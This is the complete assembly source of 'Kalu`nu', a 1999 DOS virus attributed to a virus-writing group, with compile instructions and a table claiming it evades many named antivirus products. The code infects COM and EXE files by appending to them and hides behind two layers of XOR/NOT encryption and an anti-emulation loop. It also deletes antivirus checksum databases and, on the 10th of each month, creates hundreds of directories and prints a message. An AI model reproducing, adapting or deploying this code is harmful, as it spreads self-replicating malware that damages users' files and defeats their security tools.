;******-<   Author   Info   >-**********************************************;
; Virus Name            :       Kalu`nu                                     ;
; Author                :       Kamaileon                                   ;
;                       :       aKa Decimator                               ;
; Group                 :       The Shadow Virus Group [TSVG]               ;
;                       :       http://www.virusexchange.org/shadowvx/      ;
; Author e-mail         :       kamaileon@antisocial.com                    ;
;                       :       kamaileon@mail.ru                           ;
; Origin                :       Brasil, Ago '99                             ;
; Irc                   :       #vir , #virus , #vxtrader , #shadowvx       ;
; Icq uin               :       #48473940                                   ;
;                                                                           ;
;******-<   Bio-Code Info   >-**********************************************;
; Compiling             :       Tasm/m3 destru.asm                          ;                                 
;                       :       Tlink/t destru.obj                          ;                                 
; Targetz               :       EXE/COM files (Append Method)               ;                                 
; Size                  :       1239 bytes                                  ;
; Resident              :       Nope                                        ;                                 
; PolyMorphic           :       Nope                                        ;                                 
; Encryption            :       Two layers, with XOR and NOT instructions   ;                                 
; Stealth               :       Just the old ones, nothing new in this side ;                                 
; Tunneling             :       Nope                                        ;                                 
; Retro                 :       Delete some CRC filez                       ;
; Payload               :       Create some Directorys and show a msg       ;
; Trigger               :       10th of every month                         ;
; Armoury               :       int24h adress change crashs some debuggers  ;
; AntiHeuristics        :       Encryption and AntiEmul avoids all flags    ;                                 
;                                                                           ;                                 
;******-<   Peculiarities   >-**********************************************;                                 
; - Search fo every file and verify the extension of him, so infects only   ;                                        
;   EXE and COM filez.                                                      ;                                 
; - As infection marker he makes equal the days field and secs field.       ;
; - The 2 layers of encryption and Ant-Emulation loop does all the work     ;                                 
;   against fucka AVs.                                                      ;                                 
; - Obs: The 2 Encryption routines are little differents.                   ;
; - The checked extensions are .CO* and .EX* , this can cause some trouble  ;                                 
;   if he get another files, but who cares?                                 ;
; - The AntiEmul loop could works like a psychological weapon, bcoz it      ; 
;   causes a strong slowdown in some AVs.                                   ;
;                                                                           ;                                 
;******-< Greetz and Thanks >-**********************************************;                                 
; Thanks to Pruslas, MetalKid and Raid, for test this.                      ;
; Greetz for all ppl from #vir #virus #vxtrader #vx-vtc #shadowvx           ; 
; Raid: Greetz for Toadie and the fucka Creed!! :)                          ;
; Trev and Tbh: For the funny times in #vir or #virus, buahahahahhahah      ;
;                                                                           ;                                        
;******-<     AV's Scan     >-**********************************************;
; Name                          Results                 Comments            ;                                 
; AVP 3.0 build 131             Dont Detect                :P               ;                                 
; Avast32 3.0 build 162         Dont Detect                :P               ;
; InVircible 7.02 build 295a    Dont Detect                :P               ;
; Dr.WEB 4/05 Beta              Dont Detect                :P               ;                                 
; VirusBUSTER  release1999      Dont Detect                :P               ;
; McAfee VirusScan 4.0.3        Dont Detect                :P               ;                                 
; NOD32                         Dont Detect                :P               ;                                 
; NAV 5.00.01a                  Dont Detect                :P               ;                                 
; Ivz 7.02m                     Dont Detect                :P               ;       
; F-prot 3.05b DOS              Dont Detect                :P               ;                                 
; VirusBuster V8.03.557         Dont Detect                :P               ;
; Panda AV Platinum 6.08.00     Dont Detect                :P               ;                                 
; Panda AV Win95/98 6.0         Dont Detect                :P               ;                                 
; F-Secure AV 4.04 Win95        Dont Detect                :P               ;                                 
; FindVirus 7.97                Dont Detect                :P               ;                                 
; RHBVS Version 2.54.05         Dont Detect                :P               ;
; VirusScan Plus (VSP)          Dont Detect                :P               ;
;                                                                           ;
; Command AV Win95 v4.57     Sometimes flag some           :O               ;
;                          files, as BHound Hibrid                          ;
;                                                                           ;
; TBAV 8.09b Win95              Dont Detect    Sometimes trigger some flags ;                                 
; (high Heuristic mode)                        but he dont see the virii :));                                 
;                                                                           ;
; PS: TBAV and Command AV probably                                          ; 
; dont goes beyond the encryption,                                          ; 
; leaving the main code safe.                     *Test on 2nd Generations  ;
;                                                                           ;
;******-<  I love this Job  >-**********************************************;                                 
;******-<    ShowTime!!!    >-**********************************************;                                 
                                                                                                              
code segment                                                                                                  
        assume cs:code,ds:code                                                                                
        jumps 	                                                                                              
        org 100h                                                                                              
                                                                             
EncKey   equ     1eh                                                                                          
EncKey2  equ     21h                                                                                          
                                                                                                                
begin:                                                                                                        
        push ds                                                         
                                                                            
        mov bp, sp                                                           
        int 03h                                                              
DeltaOff:                                                                    
        mov si, ss:[bp-6]  
        sub si, offset DeltaOff                                             
        xchg si, bp            
                                                                       
        push cs cs                 
        pop  es ds          
                                                                       
        mov ax, word ptr [bp+InfectType]                       
        mov word ptr [bp+TmpInfectType], ax                                     
                                                                             
Fake:                                                                        
        mov cx, 0ffffh                       
Anti:                                                                                      
        db 9ch                                                               
        xchg ax, bx                                                          
        and ax, 666h                                                         
        xor bx, ax                                                           
        xchg bx, ax                                                          
        xor bx, ax                                                           
        not bx                                                               
        shr ax, 4                                                            
        db 9dh                                                               
        loop Anti                                                            
                                                                             
        cmp word ptr [bp+InfectType], 00h    
        je contin                                                            
        call first                                                                                
        call Sec                                                             
        jmp contin                      
                                                                             
InfectType       dw      ?                                                   
                                                                             
first:                                                                       
        mov cx, (end_virus-Sec+1)/2                                          
        lea di, [bp+Sec]                                                     
        mov si, di                                                           
        mov ah, EncKey                                                       
firstloop:                                                                   
        lodsb                                                                
        xor ah, 13h                                                          
        xor al, ah                                                           
        not al                            
        stosb                                                                
        loop firstloop                                                       
        ret                                                                  
                                                                             
Sec:                                                                         
        mov cx, (end_virus-contin+1)/2                                       
        lea di, [bp+contin]                                                  
        mov si, di                                                     
        mov ah, EncKey2                                                
Secloop:                                                               
        lodsb                                                          
        not al                                                         
        xor al, ah                                               
        xor ah, 13h                                              
        stosb                                                    
        loop Secloop                                                         
        ret                                                      
                                                                        
contin:                                                          
        cmp word ptr [bp+InfectType], 1 
        je restoreCOM                                                             
        cmp word ptr [bp+InfectType], 0 
        je setDTA                                                               
        jmp restoreEXE                                   
                                                                 
old3	db	0cdh, 20h, 0                                     
                                                                 
restoreCOM:                                                      
        mov di, 100h                                             
        lea si, [bp+offset old3]                                 
        movsw                                                    
        movsb                                                    
        jmp setDTA                                               
                                                                 
restoreEXE:                                                      
        lea di, [bp+storeIP]                                                 
        lea si, [bp+oldIP]                                       
        movsw                                                           
        movsw                                           
        movsw                                           
        movsw                                                    
                                                                 
setDTA:                                                          
        mov ah, 1ah                                              
        lea dx, [bp+offset newDTA]                               
        int 21h                                                  
                                                                 
        push es                                         
        mov ax, 3524h                                   
        int 21h                                         
        mov [bp+word ptr OldInt24h], bx                   
        mov [bp+word ptr OldInt24h+2], es               
        pop es                                          
                                                        
        mov ax, 2524h                                   
        lea dx, [bp+NewInt24Hand]                                            
        int 21h                                         
                                                                        
        mov ah, 2ah                             
        int 21h                                            
        cmp dl, 0ah                                                  
        je PayBack                                                   
                                                                     
        mov ah, 4eh                                                  
next:                                                                
        lea dx, [bp+Filez]                                           
        mov cx, 7                                                    
        int 21h                                                      
        jnc VerifyExt                                                
        jmp exit                                                     
                                                                 
VerifyExt:                                                       
        push ax cx di es                                         
                                                                 
        push ds                                                  
        pop  es                                                              
                                                     
        lea dx, [bp+newDTA+1eh]                                         
        mov di, dx                                               
        mov cx, 64                                               
        mov al, '.'                                              
        repnz scasb                                              
                                                                 
        cmp [di], 'OC'                                           
        je infectCOM                                             
        cmp [di], 'XE'                                           
        je infectEXE                                             
        jmp KiLLCRCs                                 
                                                     
                                                                 
infectEXE:                                                       
        pop es di cx ax                                          
        mov word ptr [bp+InfectType], 2                  
        call OpenFile                    
        je Damm                                                                               
        mov ah, 3fh                                                          
        mov cx, 1ch                                              
        lea dx, [bp+header]                                             
        int 21h                                                  
                                                                 
        mov al, byte ptr [bp+header]               
        add al, byte ptr [bp+header+1]                           
        cmp al, 'M'+'Z'                                          
        jne Damm                                                 
        jmp cont                                                 
                                                                 
cont:                                                            
        call saveheader                                          
                                                                 
        mov al, 02h                                              
        call seek                                                
                                                                 
        push ax dx                                               
                                                                 
        call calcCSIP                                            
                                                                             
        pop dx ax                                  
                                                                        
        call calcsize                              
                                                   
        call writevirus                            
                                                   
        xor ax, ax                                 
        call seek                                  
                                                   
        mov ah, 40h                                
        mov cx, 1ch                                
        lea dx, [bp+header]                        
        int 21h                                    
                                                   
        call CloseFile                                    
                                                   
        mov ah, 4fh                                
        jmp NoMatch                                
                                                   
infectCOM:                                                                   
        pop es di cx ax                            
        mov word ptr [bp+InfectType], 1                                 
        call OpenFile                                      
        je Damm                                            
                                                           
        mov ah, 3fh                                        
        mov cx, 3                                          
        lea dx, [bp+old3]                                  
        int 21h                                            
                                                           
        mov al, 02h                                        
        call seek                                          
                                                           
        mov ax, word ptr [bp+newDTA+1ah]                   
        sub ax, 3                                          
        mov word ptr [bp+jump+1], ax                       
                                                           
        xor ax, ax                                         
        call seek                                          
                                                                             
        mov ah, 40h                                        
        mov cx, 3                                                       
        lea dx, [bp+jump]                                  
        int 21h                                            
                                                           
        mov al, 02h                                        
        call seek                                          
                                                           
        call writevirus                            
                                                   
        call CloseFile                             
        jmp NoMatch                                
                                                   
exit:                                              
        pop ds                                            
        mov dx, 80h                                
        mov ah, 1ah                                
        int 21h                                    
                                                   
        mov ax, 2524h                                                        
        lea dx, [bp+OldInt24h]                     
        int 21h                                                         
                                                   
        cmp word ptr [bp+TmpInfectType], 1 
        je HostCOM                                                     
        cmp word ptr [bp+TmpInfectType], 0 
        je nobody                                            
        jmp hostEXE                                          
                                                             
nobody:                                                      
        int 20h                                              
                                                             
HostCOM:                                                     
        push 100h                                            
        retn                                                 
                                                             
HostEXE:                                                     
        push ds                                              
        pop  es                                              
                                                                             
        mov ax, es                                           
        add ax, 10h                                                     
                                                             
        add word ptr cs:[bp+storeCS], ax                     
                                                             
        cli                                                  
        add ax, word ptr cs:[bp+storeSS]                     
        mov ss, ax                                           
        mov sp, word ptr cs:[bp+storeSP]                     
        sti                                                  
                                                             
        db 0eah                                              
                                                             
storeIP	        dw	0                                    
storeCS	        dw     	0                                    
storeSP	        dw	0                                    
storeSS	        dw	0                                    
                                                             
oldIP	     	dw	0                                    
oldCS		dw	0fff0h                                               
oldSP		dw	0                                    
oldSS	   	dw	0fff0h                                          
                                                             
PayBack:                                                     
        mov cx, 235                                          
loopDir:                                                     
        mov ah, 39h                                          
        lea dx, DirName                                      
        int 21h                                              
        inc DirName                                          
        loop loopDir                                         
                                                             
        mov ah, 09h                                          
        lea dx, [bp+PayMsg]                                  
        int 21h                                              
        jmp exit                                             
                                                             
DirName db      '!.Kalu`nu',0                                  
                                             
PayMsg  db      'Im feelin like a bad boy',10,13                             
        db      'Mn just a like a bad boy',10,13             
        db      'Im rippin up a Rag Doll',10,13                         
        db      'Like throwin away an old toy',10,13         
        db      'Some babes talkin real loud',10,13          
        db      'Talkin all about the new crowd',10,13       
        db      'Try and tell me of an old dream',10,13      
        db      'A new version of old scene',10,13           
        db      '',10,13                                        
        db      '                   (c) Kalu`nu ','$'
                                                             
KiLLCRCs:                                                    
        pop es di cx ax                                      
        lea dx, [bp+kill1CRC]                                
        call KiLL                                            
        lea dx, [bp+kill2CRC]                                
        call KiLL                                            
        lea dx, [bp+kill3CRC]                                
        call KiLL                                            
        lea dx, [bp+kill4CRC]                                
        call KiLL                                                            
        lea dx, [bp+kill5CRC]                                
        call KiLL                                                       
        lea dx, [bp+kill6CRC]                                
        call KiLL                                            
        jmp NoMatch                                          
                                                             
KiLL:                                                        
        mov ax, 4301h                                        
        xor cx, cx                                           
        int 21h                                              
                                                             
        mov ah, 41h                                          
        int 21h                                              
        ret                                                  
                                                             
kill1CRC   db      'ANTI-VIR.DAT',0                          
kill2CRC   db      'CHKLIST.MS',0                            
kill3CRC   db      'SMARTCHK.CPS',0                          
kill4CRC   db      'AVP.CRC',0                               
kill5CRC   db      'IVB.NTZ',0                                               
kill6CRC   db      'CHKLIST.TAV',0                           
                                                                        
NewInt24Hand:                                                
        xchg ax, ax                                          
        iret                                                 
                                                             
Damm:                                                        
        call CloseFile                                       
NoMatch:    	                                             
        mov ah, 4fh                                          
        jmp next                                             
                                                             
writevirus:                                                  
        call Sec                                             
        call first                                           
        mov cx, end_virus-begin                              
        lea dx, [bp+offset begin]                            
        mov ah, 40h                                          
        int 21h                                              
        call first                                                           
        call sec                                             
        ret                                                             
                                                             
saveheader:                                                  
        mov ax, word ptr [bp+header+0eh]                     
        mov word ptr [bp+oldSS], ax                          
        mov ax, word ptr [bp+header+10h]                     
        mov word ptr [bp+oldSP], ax                          
        mov ax, word ptr [bp+header+14h]                     
        mov word ptr [bp+oldIP], ax                          
        mov ax, word ptr [bp+header+16h]                     
        mov word ptr [bp+oldCS], ax                          
        ret                                                  
                                                             
CalcCSIP:                                                    
        push ax                                              
        mov ax, word ptr [bp+header+8]                       
        mov cl, 4                                            
        shl ax, cl                                           
        mov cx, ax                                                           
        pop ax                                               
                                                                        
        sub ax, cx                                           
        sbb dx, 0                                            
                                                             
        mov cl, 0ch                                          
        shl dx, cl                                           
        mov cl, 4                                            
        push ax                                              
        shr ax, cl                                           
        add dx, ax                                           
        shl ax, cl                                           
        pop cx                                               
        sub cx, ax                                           
        mov word ptr [bp+header+14h], cx                     
        mov word ptr [bp+header+16h], dx                     
        mov word ptr [bp+header+0eh], dx                     
        mov word ptr [bp+header+10h], 0fffeh                 
        ret                                                  
                                                                             
calcsize:                                                    
        push ax                                                         
                                                             
        add ax, end_virus-begin                              
        adc dx, 0                                            
        mov cl, 7                                            
        shl dx, cl                                           
        mov cl, 9                                            
        shr ax, cl                                           
        add ax, dx                                           
        inc ax                                               
        mov word ptr [bp+header+04], ax                      
        pop ax                                               
        mov dx, ax                                           
        shr ax, cl                                           
        shl ax, cl                                           
        sub dx, ax                                           
        mov word ptr [bp+header+02], dx                      
        ret                                                  
                                                                             
seek:	                                                     
        mov ah, 42h                                                     
        xor cx, cx                                           
        cwd                                                  
        int 21h                                              
        ret                                                  
                                                             
OpenFile:                                                    
        mov ax, 4300h                                        
        lea dx, [bp+offset newDTA+1eh]                       
        int 21h                                              
        mov word ptr [bp+file_attr], cx                      
                                                             
        mov ax, 4301h                                        
        lea dx, [bp+offset newDTA+1eh]                       
        xor cx, cx                                           
        int 21h                                              
	                                                     
        mov ax, 3d02h                                        
        lea dx, [bp+offset newDTA+1eh]                                       
        int 21h                                              
	                                                                
        xchg bx, ax                                          
                                                             
        mov ax, 5700h                                        
        int 21h                                              
        mov word ptr [bp+file_time], cx                      
        mov word ptr [bp+file_date], dx                      
        and cx, 0000000000011111b              
        and dx, 0000000000011111b                                                 
        cmp cx, dx                                     
        ret                                                  
                                                             
CloseFile:                                                   
        mov ax, 5701h                                        
        mov dx, word ptr [bp+file_date]                      
        mov cx, word ptr [bp+file_time]                      
        and cx, 1111111111100000b          
        and dx, 0000000000011111b                                   
        or cx, dx                                                            
        mov dx, word ptr [bp+file_date]                             
        int 21h                                                         
	                                                            
        mov ah, 3eh                                                 
        int 21h                                                     
	                                                            
        mov ax, 4301h                                               
        lea dx, [bp+offset newDTA+1eh]                              
        mov cx, word ptr [bp+file_attr]                             
        int 21h                                                     
        ret                                                         

VirusName        db     'Kalu`nu Virus', 0
Author           db     'Kamaileon', 0
VxGroup          db     'TSVG - The Shadow Virus Group', 0

OldInt24h        dd     00h                                         
jump             db	0e9h,0,0                                    
TmpInfectType    dw     ?                                           
Filez            db	'*.*',0                                              
file_attr        dw	?                                           
file_time        dw	?                                           
file_date        dw	?                                               
                                                                    
end_virus:                                                          
newDTA           db    	43  dup (?)                                 
header           db	1ch dup (?)                                 
                                                                    
code ends                                                           
end begin                                                           
